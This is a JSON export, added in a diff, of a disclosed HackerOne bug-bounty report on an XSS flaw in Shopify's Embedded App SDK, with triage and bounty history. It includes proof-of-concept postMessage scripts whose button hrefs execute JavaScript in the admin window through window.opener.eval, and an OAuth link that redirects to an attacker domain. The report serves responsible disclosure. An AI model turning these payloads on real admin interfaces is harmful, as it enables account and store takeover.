@@ -1,0 +1,281 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": "2017-05-22T20:27:48.315Z", 
+    "voters": [
+        "sp1d3rs", 
+        "michiel", 
+        "bl4de", 
+        "secator", 
+        "spam404", 
+        "zlz", 
+        "flashdisk", 
+        "ysx", 
+        "ayoubfathi", 
+        "supernatural", 
+        "and 17 more..."
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": true, 
+    "bounty_amount": "800.0", 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 217745, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": "2017-05-15T19:41:12.812Z", 
+    "vulnerability_information": "This report is similar in impact, exploitability and root-cause as report #205701 requiring an additional step of user-interaction. \n\n#Description\nThe Shopify [Embedded App SDK](https://help.shopify.com/api/sdks/merchant-apps/embedded-app-sdk) is used to facilitate limited interactions with parent page (`/admin/apps/$id`) from an embedded app within the shop admin interface. The SDK has multiple methods which accept a `buttons` parameter which is defined under the [button objects](https://help.shopify.com/api/sdks/shopify-apps/embedded-app-sdk/methods#button-objects) section of the SDK documentation. Buttons can define a `href` parameter which will open when the button is clicked. The `href` parameter is not properly sanitized allowing a malicious app to execute JavaScript in the context of the admin interface.\n\n#Technical Details\nWhen a button is clicked the `clickButton` method is called, the method is defined as follows:\n```js\nclickButton = function(_, data) {\n  if ((data.loading || \"undefined\" == typeof data.loading && \"app\" === data.target) && Shopify.Loading.start(), href = data.href) {\n    switch (data.target) {\n      case \"parent\":\n      case \"shopify\":\n        Page.visit(href, {\n          reload: true\n        });\n        break;\n        case \"app\":\n          break;\n        default:\n          Page.open(href)\n    }\n  }\n}\n```\nIf no `target` parameter is specified (and the application is already loaded) `Page.open` will be called. This method is defined like this:\n```\nPage.open = function() {\n  return window.open.apply(window, arguments);\n}\n```\nYou would expect `window.open` is safe to call with untrusted URLs as it will open in a new window/tab however this is not the case. When `window.open` is called with a `javascript:` URL a new window/tab will be opened with the domainless `about:blank` location (or similar depending on the browser) however the `document.domain` property will be shared with the opener window. Because the documents share `document.domain` the new window will be able to access the opener window and trigger JavaScript execution. You can test this yourself like this:\n```js\nwindow.open(\"javascript:window.opener.alert('bored-engineer')\")\n```\nIn the context of Shopify this means an application can create a button that will trigger XSS on the admin interface when the button is clicked. The following script was used to demonstrate the issue:\n```js\nwindow.parent.postMessage(JSON.stringify({\n  message: \"Shopify.API.Bar.initialize\",\n  data: {\n    buttons: {\n      primary: {\n        label: \"Click here for XSS\",\n        href: \"javascript:setTimeout('window.close()',1);window.opener.eval('alert(document.domain)');\",\n      }\n    }\n  }\n}), \"*\");\n```\nI wanted to note that this needs to be fixed in the `Shopify.EmbeddedAppButtons` class since this issue affects all methods which render buttons. For example the following script will also trigger XSS using a different method:\n```js\nwindow.parent.postMessage(JSON.stringify({\n  message: \"Shopify.API.Modal.open\",\n  data: {\n    src: \"https://attackerdoma.in\",\n    buttons: {\n      primary: {\n        label: \"Click here for XSS\",\n        href: \"javascript:setTimeout('window.close()',1);window.opener.eval('alert(document.domain)');\",\n      }\n    }\n  }\n}), \"*\");\n```\n\n#Exploitability\nYou need to convince an administrator to authorize your malicious application, however the exploit does not require any specific permissions to trigger so an admin may be more willing to authorize the application. Once the administrator has loaded the application it is likely they will click at least one of the multiple entry-points for buttons. \n\n#Proof of Concept\nI've created an example malicious application associated with my partner account `shopify-whitehat-1@bored.engineer` to demonstrate the issue...\nOpen the following URL on on `$your-shop$.myshopify.com`:\n```\n/admin/oauth/authorize?client_id=18cc7056a1476994411e3d21971289a7&scope=read_products&redirect_uri=https://attackerdoma.in/1b61d988-374e-48c8-ae6a-6eb28a0f25de.html&state=nonce\n```\nAfter authorizing the application and click the \"Click here for XSS\" button in the upper-right corner. An alert should appear on the `/admin` window containing `document.domain`.\n\n#Remediation\nThe application should sanitize the `href` parameter for all \"button objects\" either before creating the elements in the DOM, or in the `clickButton` method before calling `Page.open`. \n", 
+    "activity_page_count": 1, 
+    "severity": {
+        "rating": "high", 
+        "author_type": "User"
+    }, 
+    "title": "XSS in $shop$.myshopify.com/admin/ via \"Button Objects\" in malicious app", 
+    "is_member_of_team?": null, 
+    "vote_count": 27, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_create?": false, 
+            "can_view?": true
+        }
+    ], 
+    "structured_scope": null, 
+    "allow_singular_disclosure_at": null, 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "formatted_bounty": "$800", 
+    "singular_disclosure_disabled": true, 
+    "activities": [
+        {
+            "automated_response": false, 
+            "created_at": "2017-04-03T14:46:39.213Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-04-03T14:46:39.213Z", 
+            "actor": {
+                "username": "jenn-shopify", 
+                "url": "/jenn-shopify", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify", 
+            "message": "Thank you for your report! Our engineering team is investigating this issue.", 
+            "markdown_message": "<p>Thank you for your report! Our engineering team is investigating this issue.</p>\n", 
+            "type": "Activities::BugTriaged", 
+            "id": 1580561, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "bored-engineer", 
+                "url": "/bored-engineer"
+            }, 
+            "created_at": "2017-05-05T18:01:58.626Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-05-05T18:01:58.626Z", 
+            "actor": {
+                "username": "jenn-shopify", 
+                "url": "/jenn-shopify", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify", 
+            "message": "Thanks again for your report! This issue has been resolved.\n\nOur next round of bounty decisions will take place within two weeks, so we'll be in touch with you again soon.", 
+            "markdown_message": "<p>Thanks again for your report! This issue has been resolved.</p>\n\n<p>Our next round of bounty decisions will take place within two weeks, so we&#39;ll be in touch with you again soon.</p>\n", 
+            "type": "Activities::BugResolved", 
+            "id": 1656990, 
+            "genius_execution_id": null
+        }, 
+        {
+            "bounty_currency": "usd", 
+            "automated_response": false, 
+            "created_at": "2017-05-15T19:40:39.202Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-05-15T19:40:39.202Z", 
+            "actor": {
+                "url": "/shopify", 
+                "profile": {
+                    "name": "Shopify"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/382/30421c25f4a7b03ec3250e36efb64f7291402806_medium.jpg?1532728703"
+                }
+            }, 
+            "team_handle": "shopify", 
+            "bonus_amount": "0.0", 
+            "bounty_amount": "800.0", 
+            "collaborator": {
+                "username": "bored-engineer", 
+                "url": "/bored-engineer"
+            }, 
+            "message": "Thanks for the report!\n\nThis was an XSS in our Embedded App SDK, which would potentially allow a malicious application to inject javascript in the admin area. It requires user interaction but the attack is plausible because the user only see the label of the button. We've opted for a bounty higher than our minimum in this case.", 
+            "markdown_message": "<p>Thanks for the report!</p>\n\n<p>This was an XSS in our Embedded App SDK, which would potentially allow a malicious application to inject javascript in the admin area. It requires user interaction but the attack is plausible because the user only see the label of the button. We&#39;ve opted for a bounty higher than our minimum in this case.</p>\n", 
+            "type": "Activities::BountyAwarded", 
+            "id": 1675499, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-05-15T19:41:12.828Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-05-15T19:41:12.828Z", 
+            "actor": {
+                "username": "francoischagnon", 
+                "url": "/francoischagnon", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/168/3b5130025fbf90eaeb1c9234baa340dfead68f44_medium.jpg?1429126005"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify", 
+            "first_to_agree": true, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 1675501, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-05-22T20:27:48.366Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-05-22T20:27:48.366Z", 
+            "actor": {
+                "username": "bored-engineer", 
+                "url": "/bored-engineer", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/007/328/1b156e9f7c558cb2b9910d7b538b1d0190f5d1b9_medium.png?1467257466"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 1692947, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-05-22T20:27:48.423Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-05-22T20:27:48.423Z", 
+            "actor": {
+                "username": "bored-engineer", 
+                "url": "/bored-engineer", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/007/328/1b156e9f7c558cb2b9910d7b538b1d0190f5d1b9_medium.png?1467257466"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 1692948, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "reporter": {
+        "username": "bored-engineer", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/bored-engineer", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/007/328/369436c6c39c8338c3bd3c96466f58fd2b4bee1d_small.png?1467257466"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 60, 
+        "name": "Cross-site Scripting (XSS) - Generic"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "disclosed_at": "2017-05-22T20:27:48.405Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/217745", 
+    "created_at": "2017-04-02T01:07:12.877Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<p>This report is similar in impact, exploitability and root-cause as report <a href=\"/reports/205701\">#205701</a> requiring an additional step of user-interaction. </p>\n\n<h1 id=\"description\">Description</h1>\n\n<p>The Shopify <a href=\"/redirect?signature=17e4381a12866d947b44df766c59d40210fee3c6&amp;url=https%3A%2F%2Fhelp.shopify.com%2Fapi%2Fsdks%2Fmerchant-apps%2Fembedded-app-sdk\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>Embedded App SDK</span><i class=\"icon-external-link\"></i></a> is used to facilitate limited interactions with parent page (<code>/admin/apps/$id</code>) from an embedded app within the shop admin interface. The SDK has multiple methods which accept a <code>buttons</code> parameter which is defined under the <a href=\"/redirect?signature=acbf090acd3194d5060d7f4f9d81f03a41d548f2&amp;url=https%3A%2F%2Fhelp.shopify.com%2Fapi%2Fsdks%2Fshopify-apps%2Fembedded-app-sdk%2Fmethods%23button-objects\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>button objects</span><i class=\"icon-external-link\"></i></a> section of the SDK documentation. Buttons can define a <code>href</code> parameter which will open when the button is clicked. The <code>href</code> parameter is not properly sanitized allowing a malicious app to execute JavaScript in the context of the admin interface.</p>\n\n<h1 id=\"technical-details\">Technical Details</h1>\n\n<p>When a button is clicked the <code>clickButton</code> method is called, the method is defined as follows:</p>\n<pre class=\"highlight javascript\"><code><span class=\"nx\">clickButton</span> <span class=\"o\">=</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">_</span><span class=\"p\">,</span> <span class=\"nx\">data</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n  <span class=\"k\">if</span> <span class=\"p\">((</span><span class=\"nx\">data</span><span class=\"p\">.</span><span class=\"nx\">loading</span> <span class=\"o\">||</span> <span class=\"s2\">&quot;undefined&quot;</span> <span class=\"o\">==</span> <span class=\"k\">typeof</span> <span class=\"nx\">data</span><span class=\"p\">.</span><span class=\"nx\">loading</span> <span class=\"o\">&amp;&amp;</span> <span class=\"s2\">&quot;app&quot;</span> <span class=\"o\">===</span> <span class=\"nx\">data</span><span class=\"p\">.</span><span class=\"nx\">target</span><span class=\"p\">)</span> <span class=\"o\">&amp;&amp;</span> <span class=\"nx\">Shopify</span><span class=\"p\">.</span><span class=\"nx\">Loading</span><span class=\"p\">.</span><span class=\"nx\">start</span><span class=\"p\">(),</span> <span class=\"nx\">href</span> <span class=\"o\">=</span> <span class=\"nx\">data</span><span class=\"p\">.</span><span class=\"nx\">href</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"k\">switch</span> <span class=\"p\">(</span><span class=\"nx\">data</span><span class=\"p\">.</span><span class=\"nx\">target</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n      <span class=\"k\">case</span> <span class=\"s2\">&quot;parent&quot;</span><span class=\"p\">:</span>\n      <span class=\"k\">case</span> <span class=\"s2\">&quot;shopify&quot;</span><span class=\"p\">:</span>\n        <span class=\"nx\">Page</span><span class=\"p\">.</span><span class=\"nx\">visit</span><span class=\"p\">(</span><span class=\"nx\">href</span><span class=\"p\">,</span> <span class=\"p\">{</span>\n          <span class=\"na\">reload</span><span class=\"p\">:</span> <span class=\"kc\">true</span>\n        <span class=\"p\">});</span>\n        <span class=\"k\">break</span><span class=\"p\">;</span>\n        <span class=\"k\">case</span> <span class=\"s2\">&quot;app&quot;</span><span class=\"p\">:</span>\n          <span class=\"k\">break</span><span class=\"p\">;</span>\n        <span class=\"nl\">default</span><span class=\"p\">:</span>\n          <span class=\"nx\">Page</span><span class=\"p\">.</span><span class=\"nx\">open</span><span class=\"p\">(</span><span class=\"nx\">href</span><span class=\"p\">)</span>\n    <span class=\"p\">}</span>\n  <span class=\"p\">}</span>\n<span class=\"p\">}</span>\n</code></pre>\n<p>If no <code>target</code> parameter is specified (and the application is already loaded) <code>Page.open</code> will be called. This method is defined like this:</p>\n<pre class=\"highlight plaintext\"><code>Page.open = function() {\n  return window.open.apply(window, arguments);\n}\n</code></pre>\n<p>You would expect <code>window.open</code> is safe to call with untrusted URLs as it will open in a new window/tab however this is not the case. When <code>window.open</code> is called with a <code>javascript:</code> URL a new window/tab will be opened with the domainless <code>about:blank</code> location (or similar depending on the browser) however the <code>document.domain</code> property will be shared with the opener window. Because the documents share <code>document.domain</code> the new window will be able to access the opener window and trigger JavaScript execution. You can test this yourself like this:</p>\n<pre class=\"highlight javascript\"><code><span class=\"nb\">window</span><span class=\"p\">.</span><span class=\"nx\">open</span><span class=\"p\">(</span><span class=\"s2\">&quot;javascript:window.opener.alert(&#39;bored-engineer&#39;)&quot;</span><span class=\"p\">)</span>\n</code></pre>\n<p>In the context of Shopify this means an application can create a button that will trigger XSS on the admin interface when the button is clicked. The following script was used to demonstrate the issue:</p>\n<pre class=\"highlight javascript\"><code><span class=\"nb\">window</span><span class=\"p\">.</span><span class=\"nx\">parent</span><span class=\"p\">.</span><span class=\"nx\">postMessage</span><span class=\"p\">(</span><span class=\"nx\">JSON</span><span class=\"p\">.</span><span class=\"nx\">stringify</span><span class=\"p\">({</span>\n  <span class=\"na\">message</span><span class=\"p\">:</span> <span class=\"s2\">&quot;Shopify.API.Bar.initialize&quot;</span><span class=\"p\">,</span>\n  <span class=\"na\">data</span><span class=\"p\">:</span> <span class=\"p\">{</span>\n    <span class=\"na\">buttons</span><span class=\"p\">:</span> <span class=\"p\">{</span>\n      <span class=\"na\">primary</span><span class=\"p\">:</span> <span class=\"p\">{</span>\n        <span class=\"na\">label</span><span class=\"p\">:</span> <span class=\"s2\">&quot;Click here for XSS&quot;</span><span class=\"p\">,</span>\n        <span class=\"na\">href</span><span class=\"p\">:</span> <span class=\"s2\">&quot;javascript:setTimeout(&#39;window.close()&#39;,1);window.opener.eval(&#39;alert(document.domain)&#39;);&quot;</span><span class=\"p\">,</span>\n      <span class=\"p\">}</span>\n    <span class=\"p\">}</span>\n  <span class=\"p\">}</span>\n<span class=\"p\">}),</span> <span class=\"s2\">&quot;*&quot;</span><span class=\"p\">);</span>\n</code></pre>\n<p>I wanted to note that this needs to be fixed in the <code>Shopify.EmbeddedAppButtons</code> class since this issue affects all methods which render buttons. For example the following script will also trigger XSS using a different method:</p>\n<pre class=\"highlight javascript\"><code><span class=\"nb\">window</span><span class=\"p\">.</span><span class=\"nx\">parent</span><span class=\"p\">.</span><span class=\"nx\">postMessage</span><span class=\"p\">(</span><span class=\"nx\">JSON</span><span class=\"p\">.</span><span class=\"nx\">stringify</span><span class=\"p\">({</span>\n  <span class=\"na\">message</span><span class=\"p\">:</span> <span class=\"s2\">&quot;Shopify.API.Modal.open&quot;</span><span class=\"p\">,</span>\n  <span class=\"na\">data</span><span class=\"p\">:</span> <span class=\"p\">{</span>\n    <span class=\"na\">src</span><span class=\"p\">:</span> <span class=\"s2\">&quot;https://attackerdoma.in&quot;</span><span class=\"p\">,</span>\n    <span class=\"na\">buttons</span><span class=\"p\">:</span> <span class=\"p\">{</span>\n      <span class=\"na\">primary</span><span class=\"p\">:</span> <span class=\"p\">{</span>\n        <span class=\"na\">label</span><span class=\"p\">:</span> <span class=\"s2\">&quot;Click here for XSS&quot;</span><span class=\"p\">,</span>\n        <span class=\"na\">href</span><span class=\"p\">:</span> <span class=\"s2\">&quot;javascript:setTimeout(&#39;window.close()&#39;,1);window.opener.eval(&#39;alert(document.domain)&#39;);&quot;</span><span class=\"p\">,</span>\n      <span class=\"p\">}</span>\n    <span class=\"p\">}</span>\n  <span class=\"p\">}</span>\n<span class=\"p\">}),</span> <span class=\"s2\">&quot;*&quot;</span><span class=\"p\">);</span>\n</code></pre>\n<h1 id=\"exploitability\">Exploitability</h1>\n\n<p>You need to convince an administrator to authorize your malicious application, however the exploit does not require any specific permissions to trigger so an admin may be more willing to authorize the application. Once the administrator has loaded the application it is likely they will click at least one of the multiple entry-points for buttons. </p>\n\n<h1 id=\"proof-of-concept\">Proof of Concept</h1>\n\n<p>I&#39;ve created an example malicious application associated with my partner account <code>shopify-whitehat-1@bored.engineer</code> to demonstrate the issue...<br>\nOpen the following URL on on <code>$your-shop$.myshopify.com</code>:</p>\n<pre class=\"highlight plaintext\"><code>/admin/oauth/authorize?client_id=18cc7056a1476994411e3d21971289a7&amp;scope=read_products&amp;redirect_uri=https://attackerdoma.in/1b61d988-374e-48c8-ae6a-6eb28a0f25de.html&amp;state=nonce\n</code></pre>\n<p>After authorizing the application and click the &quot;Click here for XSS&quot; button in the upper-right corner. An alert should appear on the <code>/admin</code> window containing <code>document.domain</code>.</p>\n\n<h1 id=\"remediation\">Remediation</h1>\n\n<p>The application should sanitize the <code>href</code> parameter for all &quot;button objects&quot; either before creating the elements in the DOM, or in the <code>clickButton</code> method before calling <code>Page.open</code>. </p>\n", 
+    "severity_rating": "high", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "https://www.shopify.com", 
+            "about": "Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between.", 
+            "twitter_handle": "", 
+            "name": "Shopify"
+        }, 
+        "handle": "shopify", 
+        "url": "https://hackerone.com/shopify", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/001/382/1e9872bf9cfe04008c2673e07bfecaa83858cca1_small.jpg?1532728703", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/001/382/30421c25f4a7b03ec3250e36efb64f7291402806_medium.jpg?1532728703"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 1382, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
